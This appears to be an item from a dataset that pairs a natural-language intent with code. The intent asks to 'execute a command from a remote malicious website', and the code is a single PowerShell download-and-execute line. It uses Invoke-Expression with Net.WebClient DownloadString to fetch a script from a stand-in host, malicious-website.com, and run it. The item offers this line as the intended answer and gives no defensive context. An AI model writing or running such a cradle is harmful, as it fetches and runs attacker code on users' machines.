# Natural language intent:
# Execute a command from a remote malicious website

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-website.com/malicious-script.ps1')"
